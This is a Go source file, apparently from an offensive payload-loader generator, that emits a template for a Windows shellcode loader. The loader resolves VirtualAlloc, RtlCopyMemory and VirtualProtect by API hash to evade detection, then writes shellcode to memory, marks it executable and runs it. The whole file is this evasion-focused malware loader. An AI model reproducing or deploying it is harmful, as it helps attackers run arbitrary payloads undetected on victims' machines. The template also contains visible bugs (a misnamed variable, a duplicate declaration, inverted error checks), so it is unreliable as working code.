package loaders

import (
	"fmt"
)

func GetSyscallAPIHashTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)
	InformExpermimental()

	return fmt.Sprintf(`
package main

import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	loader "github.com/cmepw/myph/internals"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

func ExecuteOrderSixtySix(shellcode []byte) {

    ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()


    kernel32, err := pe.Open("C:\\Windows\\System32\\kernel32.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer kernel32.Close()


    var addr uintptr
	regionsize := uintptr(len(shellcode))
    VirtualAlloc, err := loader.LoadFunctionFromHash(loader.HashDJB2, "32b0ac787d4dba31", kernel32)
	if err != nil {
		log.Fatal(err)
	}

    addr = loader.HashedSyscall(
        VirtualAlloc,
        0,
        regionSize,
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE,
    )

    if addr == 0 {
        log.Fatal("Error: null return value")
    }

    RtlCopyMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "7a4c2ed807c8fcf1", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedSyscall(
        RtlCopyMemory,
        addr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        regionsize,
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    oldProtect := PAGE_READWRITE
    VirtualProtect, err := loader.LoadFunctionFromHash(loader.HashDJB2, "7126a1d34679917e", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedSyscall(
        VirtualProtect,
        addr,
        regionsize,
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    _, _, _ = syscall.SyscallN(addr)
}
    `)
}
